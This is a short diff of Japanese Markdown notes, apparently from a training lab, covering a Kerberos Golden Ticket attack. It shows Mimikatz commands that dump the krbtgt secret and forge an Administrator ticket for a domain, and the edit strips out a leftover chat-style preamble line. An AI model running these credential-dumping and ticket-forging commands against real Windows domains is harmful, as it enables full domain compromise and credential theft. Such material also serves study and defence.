@@ -166,9 +166,6 @@ privilege::debug
 lsadump::lsa /inject /name:krbtgt
 kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:
 ```
-以下に、指定されたコマンドをMarkdown形式でまとめます。
-
-```markdown
 ## Golden Ticket 攻撃の実行手順
 
 この手順は、WindowsのActive Directory環境でGolden Ticket攻撃を実行するためのものです。**Golden Ticket**攻撃により、Kerberosチケットを偽造して管理者権限を取得することができます。
